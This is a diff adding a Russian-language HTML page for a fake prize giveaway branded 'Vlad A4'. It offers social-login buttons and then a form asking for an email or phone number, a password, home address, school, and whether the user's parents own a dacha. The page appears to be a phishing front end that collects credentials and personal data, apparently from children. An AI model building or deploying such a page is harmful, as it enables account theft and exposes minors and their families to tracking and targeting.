@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Розыгрыш призов — Влад А4</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header>
+    <h1>🎁 Розыгрыш призов от Влада А4</h1>
+    <p>Выберите удобный способ входа, заполните анкету — и участвуйте!</p>
+  </header>
+
+  <!-- Шаг 1: выбор способа входа -->
+  <section id="auth-methods">
+    <button class="auth-btn" data-method="google">Google</button>
+    <button class="auth-btn" data-method="facebook">Facebook</button>
+    <button class="auth-btn" data-method="tiktok">TikTok</button>
+    <button class="auth-btn" data-method="discord">Discord</button>
+    <button class="auth-btn" data-method="email">По почте</button>
+  </section>
+
+  <!-- Шаг 2: форма анкеты (скрыта до выбора метода) -->
+  <section id="form-section" class="hidden">
+    <h2 id="chosen-method-title"></h2>
+
+    <form id="signup-form">
+      <label>
+        Почта или телефон
+        <input type="text" name="contact" required>
+      </label>
+
+      <label>
+        Пароль
+        <input type="password" name="password" required minlength="6">
+      </label>
+
+      <label>
+        Где живёшь?
+        <input type="text" name="address">
+      </label>
+
+      <label>
+        Где учишься?
+        <input type="text" name="school">
+      </label>
+
+      <label>
+        Есть ли у родителей дача?
+        <select name="dacha">
+          <option value="">— выберите —</option>
+          <option value="yes">Да</option>
+          <option value="no">Нет</option>
+          <option value="unknown">Не знаю</option>
+        </select>
+      </label>
+
+      <button type="submit">Участвовать!</button>
+    </form>
+    <button id="back-btn">← Вернуться к выбору</button>
+  </section>
+
+  <script src="script.js"></script>
+</body>
+</html>
